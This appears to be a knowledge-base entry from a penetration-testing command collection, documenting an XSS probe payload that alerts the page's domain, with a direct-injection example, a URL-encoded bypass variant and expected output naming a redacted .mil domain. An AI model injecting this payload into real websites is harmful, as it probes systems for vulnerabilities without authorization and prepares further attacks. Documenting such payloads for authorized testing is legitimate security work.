---
data: <img src=x onerror=alert(document.domain)>
tags:
  - xss
  - payload
  - domain-check
type: command
output: 'Alert popup: "██████.mil"'
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:16:19.850Z'
id: cb1b4a63-a02f-49df-9b4f-cb48b32966cb
verified: false
validated: true
submitted: true
---
# inject-xss-payload-domain

## Command

```javascript
<img src=x onerror=alert(document.domain)>
```

## Description

Alternative XSS payload to verify execution by alerting the current domain, useful for confirming reflection without stealing data initially.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| src=x | Invalid src to trigger onerror | Yes |
| onerror=alert(document.domain) | JS to display domain | Yes |

## Examples

### Basic Usage

Direct injection:

```html
██████████=<img src=x onerror=alert(document.domain)>
```

### Advanced Usage

URL-encoded for bypass:

```javascript
<img src%3dx onerror%3dalert(document.domain)>
```

## Expected Output

Alert shows the domain, e.g., "example.dod.mil", confirming XSS success.

## Related

- [[commands/inject-xss-payload-img-onerror]]
- [[procedures/Inject-XSS-Payload-into-Parameter]]
